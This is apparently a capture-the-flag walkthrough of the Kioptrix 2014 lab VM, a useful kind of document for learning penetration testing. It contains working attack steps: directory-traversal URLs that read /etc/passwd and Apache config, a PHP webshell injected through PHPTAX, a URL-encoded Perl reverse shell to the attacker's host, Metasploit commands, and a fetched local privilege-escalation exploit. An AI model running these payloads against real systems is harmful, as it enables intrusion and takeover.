## üñ•Ô∏èLab Setup

- VMware workstation
- Kali Linux VM
- [Kioptrix Level 5](https://www.vulnhub.com/entry/kioptrix-2014-5,62/) VM

---

## ‚¨áÔ∏èInstallation

After downloading the machine‚Äôs file, you will find that it‚Äôs a **`.tar.bz2`** file. To extract its contents I used [7-Zip](https://www.7-zip.org/) file manager:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic1.png)

Extract the content, and you will find the following files:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic2.png)

Open **`Kioptrix2014.vmx`** file using the Vmware workstation and the specs of the machine will be imported:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic3.png)

There was a disclaimer on the Vulnhub page of this machine saying that it‚Äôs preferred to remove the network card and re-add it. To do this go to **edit virtual machine settings** > **Network Adapter** and press the **remove** button:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic4.png)

Now add a new one from **Add** > **Network Adapter** make sure that the network connection type is `NAT`. After adding the new network adapter power the machine up:

## üîçHost Discovery

After installing the VM, we need to determine the IP address assigned to it. Many tools can accomplish this. In this article, we‚Äôll be using `netdiscover`:

```shell
sudo netdiscover -i eth0 -r 192.168.109.0/24
```

**"192.168.109.0/24"** is the subnet address of the NAT virtual network in my VMware Workstation. It might be different on your device. This command will show all active devices on your network.

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic6.png)

As can be seen from the above scanning result, **"192.168.109.148"** is the target IP address. The DNS server, DHCP server, and VMware default gateway are the other active hosts.

---

## üïµüèºEnumeration

After identifying the target, we need to scan for open ports and the services running on each of them to understand our attack surface. That‚Äôs where `nmap` comes in very handy.

```shell
target=192.168.109.148
sudo nmap -sS -T4 -p- -sVC -O $target -oN scan-result.txt
```

Let‚Äôs break this command down:
- `sudo`: to run it with root privileges so that we can modify the TCP default connection (Three-way handshake) to make our scan faster.
- `-sS` : for [stealthy scan](https://nmap.org/book/synscan.html)
- `-T4` : for aggressive [timing templates](https://nmap.org/book/performance-timing-templates.html)
- `-p-` : for scanning all ports
- `-sV` : for [service detection](https://nmap.org/book/vscan.html)
- `-sC` : to use [default NSE scripts](https://nmap.org/book/nse-usage.html#nse-categories)
- `-O` : [OS detection](https://nmap.org/book/man-os-detection.html)
- `-oN` : save the scan results in **"scan-result.txt"**

Here is the result of the `nmap` scan:

```shell

There are only two open ports: 80 (HTTP) and 8080 (HTTP). If my memory serves me right, this version of mod_ssl is infected with RCE. We exploited it in the [Kioptrix 1](http://127.0.0.1:4000/posts/kioptrix-1-boot-to-root/) challenge. We will check that in the next section. 

For now, let‚Äôs check the website:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic7.png)

Nothing useful on the front page. How about the source code Are there any comments?

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic8.png)

It seems like a directory name let's try to visit it:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic9.png)

It worked, and it opened a page with a software called pChart. After searching for vulnerabilities in this software I found it‚Äôs Infected with XSS and directory traversal: [pChart 2.1.3 - Multiple Vulnerabilities](https://www.exploit-db.com/exploits/31173?source=post_page-----b3f8b9cbefa2--------------------------------).

We will get back to that later on. For now, it's time to check port 8080:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic10.png)

We are not authorized to access this page?!

Before ending this section, let's fuzz for directories. `gobuster` is my favorite tool for that:

```shell
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://192.168.109.148//pChart2.1.3/examples/ -x php,html,sh,txt
```

Output:

## üë®üèª‚ÄçüíªExploitation

In the previous section, we mentioned that the `mod_ssl` version is infected with RCE. The problem here is that the Apache version is `2.2.21` which means the exploitation will not work with it. Vulnerable versions of Apache are:

```shell
===================================snippet===================================

        0x32 - FreeBSD (apache-1.3.27)
===================================snippet===================================
```

Since it didn‚Äôt work let‚Äôs move on to the other finding that can be useful which is **"pchart"** directory traversal vulnerability. The infected parameter is `Script` . The URL used to retrieve `/etc/passwd`{: .filepath} file will be something like this:

```
http://192.168.109.148/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
```

Output:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic12.png)

Whenever you encounter such a vulnerability, use it to read the source code of web pages and configuration files for the Apache service.

Let‚Äôs open `index.php` source code using this URL:

```
http://192.168.109.148/pChart2.1.3/examples/index.php?Action=View&Script=index.php
```

The information that could be interesting includes filenames (e.g., .php, .html, .txt), user credentials, and useful comments. Unfortunately, I didn‚Äôt find any useful information inside `index.php`.

Next, we should check the Apache configuration file in FreeBSD the file is located under this path: `/usr/local/etc/apacheX/httpd.conf`{: .filepath} where `X` is the Apache version. In our case, the version is 2.2.21, so `X` is 22 (the first two numbers of the version). According to that, the URL will be:

```
http://192.168.109.148/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf
```

As we already know and have shown above, the Apache service is listening on ports **80** and **8080**. Let‚Äôs check if there is any configuration that prevents us from accessing port **8080**:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic14.png)

As shown in the configuration snippet above, the `User-Agent` that is allowed to access the webpage hosted on the port **8080** must start with `Mozilla/4.0`. To access it, we must change our `User-Agent`. To do this, use any proxy tool. I prefer using [Burp Suite](https://www.youtube.com/watch?v=pfaa9YDypJc). It is installed on Kali Linux by default. Let‚Äôs intercept our request and change The `User-Agent`:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic15.png)

After modifying the `User-Agent` value and forwarding the request, we managed to access the webpage:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic16.png)

To modify the `User-Agent` automatically go to **proxy settings** > **match and replace rules** and enable this option:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic17.png)

There is a page named phptax. After visiting it, I found the following content:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic18.png)

What is **"PHPTAX"** in the first place?

>**"PHPTAX"** is software used to calculate U.S. income taxes. The application is prone to a remote code-execution vulnerability because it fails to sanitize user-supplied input submitted to the ‚Äòpfilez‚Äô parameter of the ‚Äòdrawimage.php‚Äô script.
{: .prompt-info }

After using `searchsploit` I found out that there are two methods to exploit this software:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic19.png)

## Method 1: File Manipulation ‚Äònewvalue‚Äô / Remote Code Execution

The exploit simply creates a file named rce.php and injects the following PHP code into it: <?php passthru($_GET[‚Äòcmd‚Äô]); ?>. We then use the cmd parameter to execute our malicious commands on the web server.

First, we use the URL-encoded payload in the URL, so it will be:

```
http://192.168.109.148:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E
```

Using that URL, we created the file. Now, we should send a request to the file location with the `cmd` parameter to execute our commands. Let‚Äôs say we want to run the `id` command, so the URL will be:

```
http://192.168.109.148:8080/phptax/data/rce.php?cmd=id
```

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic20.png)

Now that it is working, let‚Äôs set up a reverse shell. First, we should establish the listener on Kali machine. I‚Äôll use nc for that:

```shell
nc -lnvp 7701
```

I tried `nc` , `python` , and `bash` but none of them worked. Let‚Äôs try `Perl` payload. I got the payload from the [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#perl). The URL will be:

```
http://192.168.109.148:8080/phptax/data/rce.php?cmd=perl%20-e%20%27use%20Socket%3b%24i%3d%22192.168.109.131%22%3b%24p%3d7701%3bsocket(S%2cPF_INET%2cSOCK_STREAM%2cgetprotobyname(%22tcp%22))%3bif(connect(S%2csockaddr_in(%24p%2cinet_aton(%24i)))){open(STDIN%2c%22%3E%26S%22)%3bopen(STDOUT%2c%22%3E%26S%22)%3bopen(STDERR%2c%22%3E%26S%22)%3bexec(%22%2fbin%2fsh%20-i%22)%3b}%3b%27
```

And boom!

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic21.png)

We have a reverse shell now :)

## Method 2: "pfilez" Execution Remote Code Injection

This exploitation can be done manually or using Metasploit. Since we have done the first method manually, let‚Äôs try the automated one using `msfconsole`. The sequence of commands will be:

```shell
msfconsole #run metasploit framwork
search phptax #search for modules related to phptax
use 0 or use exploit/multi/http/phptax_exec # to use the module
show options # to display the options and what is required to be set
set RHOSTS 192.168.109.148 #set target ip
set RPORT 8080 #set target port
set PAYLOAD cmd/unix/reverse_perl #choose payload
set LHOST eth0 #set local ip of interface eth0
set useragent Mozilla/4.0\ (Macintosh;\ Intel\ Mac\ OS\ X\ 10_15_7)\ AppleWebKit/537.36\ (KHTML,\ like\ Gecko)\ Chrome/123.0.0.0\ Safari/537.36
run
```

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic22.png)

After running you will get a reverse shell:

## üí•Post-Exploitation

Now that we have a shell, the next goal is to gain root access. From the enumeration section, we know that we are dealing with the FreeBSD operating system. To be more sure you can check it with this command:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic24.png)

Using `searchsploit`, I found two exploits:

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic25.png)

Let‚Äôs try the first one. Bring the source code to the current working directory using this command:

```shell
searchsploit -m freebsd/local/28718.c
```

Next, to transfer the file to the victim machine, we are going to run a simple HTTP server using Python:

```shell
python3 -m http.server 80
```

Now, on the victim machine, navigate to a directory where you have write permissions. `/tmp`{: .filepath} is commonly used for that purpose. After that download the file. I tried to do this using `wget` but it didn‚Äôt work so I went for `fetch`:

```shell
fetch http://192.168.109.131:80/28718.c
```

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic26.png)

The final step is to compile and run the exploit:

```shell
gcc -o privesc 28718.c
```

![Desktop View](/assets/img/posts/2024-06-21-kioptrix-5-boot-to-root/pic27.png)

Kudos! That‚Äôs it for today. I hope this writeup was useful for you folks; stay safe and keep pinging :)
